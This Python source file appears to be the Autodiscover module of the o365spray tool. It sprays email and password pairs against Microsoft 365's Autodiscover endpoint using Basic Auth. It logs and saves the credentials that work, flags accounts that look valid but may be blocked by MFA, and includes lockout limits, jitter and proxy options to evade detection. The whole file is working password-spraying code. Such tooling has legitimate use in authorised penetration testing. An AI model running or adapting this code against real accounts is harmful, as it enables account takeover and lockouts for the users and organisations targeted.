#!/usr/bin/env python3

import time
import logging
from requests.auth import HTTPBasicAuth  # type: ignore
from o365spray.core.utils import (
    Defaults,
    text_colors,
)
from o365spray.core.handlers.sprayer.modules.base import SprayerBase


class SprayModule_autodiscover(SprayerBase):
    """Autodiscover Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_autodiscover, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users on Microsoft using Microsoft Autodiscover

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            auth = HTTPBasicAuth(email, password)
            url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
            response = self._send_request(
                "get",
                url,
                auth=auth,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle accounts that appear valid, but could have another factor
            # blocking full authentication
            elif status == 456:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                    " (Manually confirm [MFA, Locked, etc.])"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle Autodiscover errors that are returned by the server
            elif "X-AutoDiscovery-Error" in response.headers.keys():
                # Handle Basic Auth blocking
                if any(
                    str_ in response.headers["X-AutoDiscovery-Error"]
                    for str_ in Defaults.BASICAUTH_ERRORS
                ):
                    logging.info(
                        f"[{text_colors.FAIL}BLOCKED{text_colors.ENDC}] {email}:{password}"
                        " (Basic Auth blocked for this user.)"
                    )
                    # Remove basic auth blocked user from being sprayed again
                    self.userlist.remove(user)

                # Handle tenants that are not capable of this type of auth
                elif (
                    "TenantNotProvisioned" in response.headers["X-AutoDiscovery-Error"]
                ):
                    logging.info(
                        "Tenant not provisioned for this type of authentication. Shutting down..."
                    )
                    self.exit = True
                    return self.shutdown()

                # Handle Microsoft AADSTS errors
                else:
                    self._check_aadsts(
                        user,
                        email,
                        password,
                        response.headers["X-AutoDiscovery-Error"],
                    )

            else:
                print(
                    f"[{text_colors.FAIL}INVALID{text_colors.ENDC}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass
